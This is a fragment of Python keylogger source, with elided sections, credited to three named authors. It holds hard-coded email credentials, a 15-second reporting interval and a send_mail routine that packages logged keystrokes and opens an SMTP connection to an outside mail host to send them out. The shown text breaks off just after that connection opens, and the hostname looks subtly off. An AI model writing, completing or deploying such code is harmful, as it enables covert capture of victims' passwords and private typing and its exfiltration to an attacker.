try:
    ...
    EMAIL_ADDRESS = "6fa999e1d9438d"
    EMAIL_PASSWORD = "350d82bc2578b8"
    SEND_REPORT_EVERY = 15 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started - Update every 15 seconds"
            self.email = email
        ...
        def send_mail(self, email, password, message):
            ...
            Keylogger by Logan Wilmoth, Ryan Yen, and Julian Frank\n"""

            m += message
            with smtplib.SMTP("smtp.gmail.io", 587) as server:
